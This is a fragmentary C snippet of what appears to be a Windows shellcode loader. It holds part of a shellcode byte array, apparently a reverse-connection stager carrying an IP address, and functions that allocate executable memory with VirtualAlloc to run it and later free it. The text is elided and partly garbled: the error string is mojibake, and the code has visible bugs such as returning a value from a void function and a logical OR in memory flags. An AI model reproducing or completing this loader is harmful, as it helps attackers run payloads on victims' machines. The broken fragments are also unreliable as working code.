...
"\x6b\x00\xff\xd5\x6a\x0a\x68\x0a\xad\x0c\xf0\x68\x02\x00"
...
void Runcode1() {
	LPVOID p = NULL;
	if (!(p = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
		printf("·ÖÅäÄÚ´æÊ§°Ü");
		return 0;
	}
...
void Runcode2() {
	...
	VirtualFree(p, sizeof(shellcode), MEM_COMMIT||MEM_RESERVE);
}
